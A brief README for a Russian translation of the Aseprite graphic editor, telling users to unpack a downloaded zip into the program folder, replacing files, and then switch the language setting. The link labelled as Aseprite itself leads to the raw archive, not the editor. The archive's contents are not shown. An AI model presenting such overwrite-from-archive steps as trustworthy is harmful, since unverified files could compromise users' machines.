# Aseprite Russian Language
Russian Language for the [Aseprite](https://raw.githubusercontent.com/Hyperb0re4/aseprite-language-russian/main/data/aseprite-language-russian_3.5.zip) graphic editor.

## Installation
Unpack ```data``` and ```extensions``` folders from the [archive](https://raw.githubusercontent.com/Hyperb0re4/aseprite-language-russian/main/data/aseprite-language-russian_3.5.zip) into the Aseprite root folder, replacing the files.

## Switch Language
Go to ```Edit``` -> ```Preferences``` on the ```General``` tab switch the language to ```ru```.
